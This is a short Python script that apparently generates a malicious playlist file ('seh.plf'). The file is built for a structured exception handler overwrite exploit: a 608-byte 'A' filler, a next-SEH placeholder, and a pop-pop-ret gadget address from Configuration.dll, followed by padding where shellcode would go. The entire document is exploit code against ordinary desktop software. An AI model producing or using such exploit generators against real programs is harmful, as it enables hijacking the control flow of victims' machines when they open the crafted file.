#!/usr/bin/env python
import struct

filename="seh.plf"

#----------------------------------------------------------------
# SEH:  0x60346758 : pop ebx # pop esi # ret  | Configuration.dll
#----------------------------------------------------------------

seh  = struct.pack("<I", 0x60346758)
buffer = "A"*608 + "B"*4 + seh + "C"*1384
textfile = open(filename, 'w')
textfile.write(buffer)
textfile.close()